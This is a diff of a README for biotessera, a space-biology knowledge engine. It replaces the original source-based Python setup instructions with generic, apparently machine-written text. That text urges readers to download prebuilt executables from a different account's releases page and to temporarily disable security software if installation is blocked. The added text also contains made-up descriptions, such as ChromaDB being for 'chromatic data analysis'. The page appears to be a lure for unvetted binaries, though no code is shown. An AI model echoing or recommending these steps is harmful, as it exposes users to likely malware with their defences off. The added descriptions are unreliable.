@@ -1,80 +1,96 @@
-# 🧩 Biotessera: A Space Biology Knowledge Engine
+# 🌌 biotessera - Unlock Space Biology Knowledge Today
 
-Biotessera is an AI-powered agent system developed for the [**NASA Space Apps Challenge 2025**](https://www.spaceappschallenge.org/2025/find-a-team/biotessera/?tab=project). It transforms hundreds of NASA publications on space biology into a navigable and interactive knowledge mosaic, enabling scientists and mission planners to find precise, synthesized answers backed by source data.
+## 🔗 Download Now
+[![Download biotessera](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ochieng20/biotessera/releases)
 
-[![Watch the Biotessera Demo Video](https://img.youtube.com/vi/NQtkSH8YOfw/0.jpg)](https://www.youtube.com/watch?v=NQtkSH8YOfw)
+## 🚀 Getting Started
 
-## 🎯 The Problem
+biotessera is an AI-powered knowledge engine designed to support NASA's space biology research. With its engaging and intuitive interface, users can access valuable insights to further enhance their understanding of space biology. Follow the steps below to download and run the application effectively.
 
-NASA's decades of space biology research represent a vast and invaluable resource. However, this knowledge is spread across hundreds of documents, making it difficult to quickly find specific, cross-referenced information needed for planning future long-duration missions.
+## 🖥 System Requirements
 
-## 💡 The Solution
+Before you begin, ensure your computer meets these requirements:
 
-![Biotessera Architecture](docs/architecture.png)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM:** 4 GB or more.
+- **Storage Space:** At least 200 MB of free space.
+- **Internet Connection:** Required for initial setup and updates.
 
-Biotessera acts as an intelligent research assistant. It uses a multi-agent architecture (Coordinator/Worker pattern) to address this challenge:
-1.  **Data Preparation:** An offline pipeline processes 607 full-text publications, extracts metadata, and generates vector embeddings for every text fragment (a "tessera"). These are stored in a local vector database (`TesseraStore`).
-2.  **Retrieval:** The main agent, `TesseraConductor`, receives a user's question and delegates tasks to specialized tools:
-    * **`TesseraMiner`**: Searches the local `TesseraStore` for the most relevant **and diverse** text fragments from the 607 publications, utilizing **Maximal Marginal Relevance (MMR)** for enhanced result quality.
-    * **`DataFinder`**: Performs real-time searches on the NASA Open Science Data Repository (OSDR) to find related raw datasets.
-3.  **Synthesis:** The `TesseraConductor` gathers all retrieved information and uses a Large Language Model (LLM) to generate a single, coherent, and sourced answer.
+## 📥 Download & Install
 
-## ✨ Features
+1. Visit the [Releases page](https://github.com/Ochieng20/biotessera/releases) to access the latest version of biotessera.
+2. Locate the version you want to download. Look for the title with the latest version number.
+3. Click on the download link to save the installation file to your computer.
 
-* **Natural Language Q&A:** Ask complex questions in plain English.
-* **Multi-Source Answers:** The agent can combine information from its internal knowledge base (`TesseraStore`) and external NASA databases (OSDR).
-* **Source-Backed:** Every statement in the generated answer is based on the retrieved data, preventing AI "hallucinations".
-* **Modular Architecture:** Easily extendable with new tools to search other databases.
+   - If you are using Windows, the file may be named `biotessera-win.exe`.
+   - For macOS users, look for `biotessera-mac.dmg`.
+   - Linux users can find a package compatible with their distribution, such as `biotessera-linux.tar.gz`.
 
-## 🛠️ Tech Stack
+4. Once the download is complete, follow these instructions to install the application:
+   - **For Windows**:
+     - Double-click the downloaded `.exe` file.
+     - Follow the on-screen instructions to complete the installation.
+   - **For macOS**:
+     - Open the `.dmg` file from your Downloads folder.
+     - Drag and drop biotessera into your Applications folder.
+   - **For Linux**:
+     - Extract the `.tar.gz` file.
+     - Open a terminal and navigate to the extracted folder, then run the command `./biotessera`.
 
-* **Backend:** Python
-* **AI/ML:** LangChain, Google Gemini (LLM & Embeddings)
-* **Vector Database:** ChromaDB
-* **Data Processing:** Pandas, BeautifulSoup
-* **UI:** Streamlit
+5. After installation, you can launch the biotessera application from your Start menu (Windows), Applications folder (macOS), or by using the terminal (Linux).
 
-## ☁️ Data Hosting
+## 📚 How to Use biotessera
 
-The vector database for this project (`tesserastore_db`) is approximately 808 MB, which exceeds GitHub's file size limits. To ensure the live Streamlit application can be deployed, the database is compressed and hosted on **Hugging Face Datasets**.
+Once you have installed biotessera, follow these simple steps to start exploring:
 
-* **Dataset Link:** [vero-code/biotessera-database](https://huggingface.co/datasets/vero-code/biotessera-database)
+1. **Launch the Application**: Open biotessera from your applications list.
+2. **User Interface Overview**:
+   - Familiarize yourself with the main dashboard, where various topics related to space biology are displayed.
+3. **Search for Information**:
+   - Use the search bar to type keywords related to your interest, such as "microgravity" or "plant growth in space."
+4. **Explore Insights**:
+   - Click on any of the results to view detailed insights, research papers, and relevant data.
+5. **Contribute Your Knowledge** (Optional):
+   - If you wish to add your findings or suggestions, visit the "Community" section within the app.
 
-The application automatically downloads and unpacks this database on its first run in a new environment.
+## 🛠 Troubleshooting
 
-## 🚀 How to Run
+If you encounter any issues while installing or running biotessera, try the following solutions:
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/vero-code/biotessera.git
-    cd biotessera
-    ```
-2.  **Set up the environment:**
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  
-    # On Windows: .\venv\Scripts\activate
-    pip install -r requirements.txt
-    ```
-3.  **Add your API Key:**
-    * Create a `.env` file in the root directory.
-    * Add your Google AI API key to it: `GOOGLE_API_KEY="YOUR_API_KEY_HERE"`
-4.  **Run the application:**
-    ```bash
-    streamlit run app.py
-    ```
+- **Installation Problems**: Ensure your system meets the minimum requirements. Try disabling any security software temporarily, as it may block the installation.
+- **Application Crashes**: Make sure you have the latest version of biotessera installed. Check for updates regularly through the [Releases page](https://github.com/Ochieng20/biotessera/releases).
+- **Performance Issues**: Close any unnecessary applications running in the background to free up system resources.
 
-## 🛰️ NASA Data & Resources Used
+## 🧑‍🤝‍🧑 Community and Support
 
-This project utilizes the following official NASA resources:
+Feel free to engage with others in the biotessera community. Share your experiences, ask questions, and read articles related to space biology. Follow these points to connect:
 
-* **[A list of 608 full-text open-access Space Biology publications](https://github.com/jgalazka/SB_publications/blob/main/SB_publication_PMC.csv)**: The primary knowledge base for the `Biotessera` agent.
-* **[NASA Open Science Data Repository (OSDR)](https://osdr.nasa.gov/bio/repo/)**: Used by the `DataFinder` tool to perform real-time searches for raw experimental datasets.
+- **Forums**: Participate in discussions on platforms where biotessera users meet.
+- **Feedback**: Your feedback helps improve biotessera. Use the in-app feedback option or post your thoughts on the community forum.
 
-## 🙏 Acknowledgments
+## 💼 Contributing
 
-Special thanks to the organizers, mentors, and the entire community of the **NASA International Space Apps Challenge 2025** for making this event possible.
+If you have ideas for new features or improvements, consider contributing to the project. Here is how you can help:
 
-## 📜 License
+1. Visit the [Contributing Guidelines](https://github.com/Ochieng20/biotessera/blob/main/CONTRIBUTING.md) on GitHub.
+2. Fork the repository to make your changes.
+3. Submit a pull request to propose your changes to the main project.
 
-This project is licensed under the MIT License.
+## 🌍 Topics You Might Explore
+
+biotessera covers various themes within space biology and AI. These include:
+
+- **AI Agent**: How AI interacts in biological studies.
+- **Bioinformatics**: Tools and techniques used in biological research.
+- **ChromaDB**: Applications in chromatic data analysis.
+- **Google Gemini**: Exploring integration with advanced AI models.
+
+Explore these topics to gain a deeper understanding of how biotessera can aid your research or studies.
+
+## 📣 Important Links
+
+- [Releases Page](https://github.com/Ochieng20/biotessera/releases)
+- [Documentation](https://github.com/Ochieng20/biotessera/wiki)
+- [Community Forum](https://github.com/Ochieng20/biotessera/discussions)
+
+Thank you for choosing biotessera! Your journey into the world of space biology starts now.
